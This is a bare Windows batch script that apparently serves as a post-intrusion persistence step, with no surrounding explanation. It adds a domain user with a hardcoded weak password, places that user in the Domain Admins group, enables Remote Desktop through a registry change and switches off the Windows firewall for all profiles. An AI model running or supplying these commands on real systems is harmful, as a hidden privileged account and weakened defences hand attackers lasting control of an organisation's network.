ECHO OFF
net user professorp Password123! /add /domain
net group "domain admins" professorp /add /domain
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall set allprofiles state off
PAUSE
